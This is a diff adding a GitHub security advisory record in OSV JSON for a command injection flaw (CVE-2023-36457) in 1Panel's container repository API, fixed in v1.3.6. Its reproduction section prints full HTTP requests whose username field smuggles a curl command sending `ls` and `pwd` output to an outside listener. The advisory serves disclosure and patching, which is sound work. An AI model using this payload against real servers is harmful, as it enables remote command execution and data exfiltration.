@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-q2mx-gpjf-3h8x",
+  "modified": "2023-07-05T21:38:07Z",
+  "published": "2023-07-05T21:38:07Z",
+  "aliases": [
+    "CVE-2023-36457"
+  ],
+  "summary": "1Panel vulnerable to command injection when adding container repositories",
+  "details": "### Impact\n\nThe authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.\n\n1. Vulnerability analysis.\n\n```\nbackend\\app\\api\\v1\\image_repo.go#create\n```\n![image](https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png)\n\n```\nbackend\\app\\service\\image_repo.go#CheckConn\n```\n![image](https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png)\n\n2. vulnerability reproduction.\n\n```\nPOST /api/v1/containers/repo HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 446\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n```\n\n```\n{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`ls`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n```\n\n3. Using update can be triggered multiple times.\n\n```\nPOST /api/v1/containers/repo/update HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 447\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n```\n\n```\n{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`pwd`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n```\n\nAffected versions: <= 1.3.5\n\n### Patches\n\nThe vulnerability has been fixed in v1.3.6.\n\n### Workarounds\n\nIt is recommended to upgrade the version to v1.3.6.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/1Panel-dev/1Panel"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.3.6"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36457"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/1Panel-dev/1Panel"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-74",
+      "CWE-77"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-05T21:38:07Z",
+    "nvd_published_at": "2023-07-05T21:15:09Z"
+  }
+}
